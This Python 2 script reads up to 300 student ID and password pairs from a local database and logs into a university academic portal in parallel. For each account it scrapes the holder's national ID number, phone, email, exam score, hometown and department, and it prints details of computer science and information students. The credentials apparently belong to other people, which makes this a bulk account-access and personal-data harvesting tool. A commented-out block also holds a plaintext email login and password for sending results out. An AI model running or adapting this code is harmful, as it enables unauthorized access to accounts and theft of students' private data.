# -*- coding: utf-8 -*-
import requests
import string
import sqlite3
import time
from email.mime.text import MIMEText
from email import encoders
from email.header import Header
from email.utils import parseaddr, formataddr
import smtplib
from bs4 import BeautifulSoup
from urlparse import urljoin
from multiprocessing import Queue, Pool
URP_URL = 'http://210.30.7.100:8088/'


class DlnuUrp(object):
    def __init__(self, stuid, passwd):
        self.login_url = urljoin(URP_URL, 'loginAction.do')
        self.all_score_url = urljoin(URP_URL, 'gradeLnAllAction.do?type=ln&oper=fa')
        self.s = requests.Session()

        self.postdata = {
            'ldap': 'auth',
            'zjh': stuid,
            'mm': passwd
            }

        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1',
            'Accept': 'application/x-www-form-urlencoded',
            'Accept-Language': 'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'http://zhjw.dlnu.edu.cn/gradeLnAllAction.do?type=ln&oper=fa'
            }

    def login(self):
        try:
            req = self.s.get(URP_URL, timeout=(1, 1))
            if req.status_code == 200:
                req = self.s.post(self.login_url, data=self.postdata)
                if u'用户名或密码不正确' in req.text:
                    return 2
                else:
                    return 0
            else:
                return -2

        except :
            return -1


class GetStuInfo(DlnuUrp):
    def __init__(self, stuid, passwd):
        self.stuid = stuid
        super(GetStuInfo, self).__init__(stuid, passwd)
        self.basicinfo_url = urljoin(URP_URL, 'userInfo.jsp')
        self.detailinfo_url = urljoin(URP_URL, 'xjInfoAction.do?oper=xjxx')

    def get_basic_info(self):
        req = self.s.get(self.basicinfo_url)
        soup = BeautifulSoup(req.text, "lxml")
        name_tag = soup.find('td', width="215", align="right", class_="fieldName").find_next()
        infos = soup.find_all(type="text")
        return {
            'name': name_tag.string.strip(),  # 姓名
            'stuid': self.stuid,              # 学号
            'phone': infos[0]['value'],       # 电话
            'email': infos[2]['value'],       # 邮件地址
        }

    def get_detail_info(self):
        req = self.s.get(self.detailinfo_url)
        soup = BeautifulSoup(req.text, "lxml")
        tags = soup.find_all('td', class_="fieldName", width="180")

        en_name_tag = tags[3].find_next()
        id_card_no_tag = tags[5].find_next()
        gender_tag = tags[6].find_next()
        nationality_tag = tags[11].find_next()
        province_tag = tags[15].find_next()
        middle_school_tag = tags[16].find_next()
        gk_score_tag = tags[17].find_next()
        department_tag = tags[25].find_next()
        major_tag = tags[26].find_next()
        class_tag = tags[29].find_next()
        campus_tag = tags[32].find_next()
        basicdata = self.get_basic_info()

        return {
            'name': basicdata['name'],                          # 姓名
            'en_name': en_name_tag.string.strip(),              # 英文姓名
            'id_card_no': id_card_no_tag.string.strip(),        # 身份证号
            'gender': gender_tag.string.strip(),                # 性别
            'stuid': basicdata['stuid'],                        # 学号
            'phone': basicdata['phone'],                        # 电话
            'email': basicdata['email'],                        # 电子邮件地址
            'nationality': nationality_tag.string.strip(),      # 民族
            'province': province_tag.string.strip(),            # 籍贯
            'middle_school': middle_school_tag.string.strip(),  # 毕业中学
            'gk_score': gk_score_tag.string.strip(),            # 高考分数
            'department': department_tag.string.strip(),        # 所属院系
            'major': major_tag.string.strip(),                  # 专业
            'class': class_tag.string.strip(),                  # 班级
            'campus': campus_tag.string.strip(),                # 校区
        }


if __name__ == '__main__':
    qInfo = Queue()

    def get_math(user):
        fun = GetStuInfo(user[0], user[1])
        if fun.login() == 0:
            global qInfo
            ret = fun.get_detail_info()
            if (u'计算机科学' or u'信息') in ret['department']:
                print ret['name'], ret['department'], ret['major'], ret['phone'], len(ret['phone'])


    conn = sqlite3.connect('User.db')
    l = conn.execute("SELECT * FROM USERS LIMIT 300;")
    ll = []

    for i in l:
        ll.append(i)

    pool = Pool(16)
    a = time.time()

    pool.map(get_math, ll)

    pool.close()
    pool.join()

    print u'用时', time.time() - a, u'秒'


    '''

def __format_addr(s):
    name, addr = parseaddr(s)
    return formataddr(
        (
            Header(name, 'utf-8').encode(), addr.encode('utf-8') if isinstance(addr, unicode) else addr
        )
    )


    from_addr = '903221074@qq.com'
    passwd = 'Aston77Martin'
    SMTP_Server = 'smtp.qq.com'
    Sendto = '903221074@qq.com'

    msg = MIMEText(result_text, 'plain', 'utf-8')
    msg['From'] = __format_addr(u'Jolly_Python<%s>' % from_addr)
    msg['To'] = __format_addr(u'管理员<%s>' % Sendto)
    msg['Subject'] = Header(u'试验结果  --来自赵磊的Python', 'utf-8').encode()

    server = smtplib.SMTP(SMTP_Server, 25)
    server.set_debuglevel(1)
    server.login(from_addr, passwd)
    server.sendmail(from_addr, [Sendto], msg.as_string())

    server.quit()
    '''
